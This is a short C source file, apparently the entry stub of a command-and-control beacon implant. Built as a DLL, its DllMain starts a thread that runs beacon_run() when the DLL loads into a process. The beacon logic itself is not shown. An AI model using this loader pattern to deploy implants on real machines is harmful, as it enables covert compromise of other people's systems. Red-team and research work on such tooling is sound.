#include "common.h"
#include "beacon.h"


static DWORD WINAPI BeaconThread(LPVOID lpParam) {
    (void)lpParam;
    beacon_run();
    return 0;
}

#ifdef BEACON_DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    (void)lpReserved;
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        printf("[*] DllMain: DLL_PROCESS_ATTACH — spawning beacon thread\n");
        CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        printf("[*] DllMain: DLL_PROCESS_DETACH\n");
        break;
    }
    return TRUE;
}
#endif
